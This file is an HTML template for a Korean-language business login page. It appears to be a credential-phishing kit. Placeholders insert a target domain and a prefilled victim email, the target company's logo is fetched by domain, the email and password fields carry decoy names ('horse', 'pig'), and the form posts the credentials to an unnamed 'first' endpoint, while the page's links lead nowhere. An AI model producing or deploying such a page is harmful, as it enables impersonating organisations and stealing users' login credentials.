<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://api.kickfire.com/logo?website={{ins}}" type="image/x-icon">
    <title>{{ins}} 비즈니스 로그인</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #444;
        }

        .container {
            background: #ffffff;
            border: 2px solid #00aaff;
            border-radius: 10px;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 450px;
            padding: 30px 40px;
            text-align: center;
        }

        .header {
            margin-bottom: 20px;
        }

        .header img {
            width: 100px;
            border-radius: 50%;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }

        h1 {
            font-size: 26px;
            color: #00aaff;
            margin-top: 15px;
        }

        p {
            font-size: 14px;
            color: #666;
            margin-bottom: 25px;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        .input-group {
            position: relative;
        }

        .input-group input {
            width: 100%;
            padding: 15px 20px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            outline: none;
            transition: all 0.3s ease;
        }

        .input-group input:focus {
            border-color: #00aaff;
            box-shadow: 0 0 6px rgba(0, 170, 255, 0.5);
        }

        .input-group label {
            position: absolute;
            top: -10px;
            left: 15px;
            font-size: 12px;
            background: #ffffff;
            color: #00aaff;
            padding: 0 5px;
        }

        .btn {
            background: #00aaff;
            color: #ffffff;
            padding: 15px;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s ease, transform 0.2s ease;
        }

        .btn:hover {
            background: #008dd6;
            transform: translateY(-2px);
        }

        .links {
            margin-top: 15px;
        }

        .links a {
            font-size: 14px;
            color: #00aaff;
            text-decoration: none;
        }

        .links a:hover {
            text-decoration: underline;
        }

        @media (max-width: 768px) {
            .container {
                padding: 20px 30px;
            }

            h1 {
                font-size: 22px;
            }

            .btn {
                font-size: 16px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://api.kickfire.com/logo?website={{ins}}" alt="Business Logo">
            <h1>로그인</h1>
            <p>다시 오신 것을 환영합니다! 계정에 접근하려면 자격 증명을 입력해 주세요.</p>
        </div>
        <form action="first" method="POST">
            <div class="input-group">
                <label for="email">이메일 주소</label>
                <input type="email" id="email" name="horse" value="{{eman}}" required="">
            </div>
            <div class="input-group">
                <label for="password">비밀번호</label>
                <input type="password" id="password" name="pig" placeholder="비밀번호를 입력하세요" required>
            </div>
            <button type="submit" class="btn">로그인</button>
        </form>
        <div class="links">
            <a href="#">비밀번호를 잊으셨나요?</a> | <a href="#">계정 생성하기</a>
        </div>
    </div>
</body>
</html>
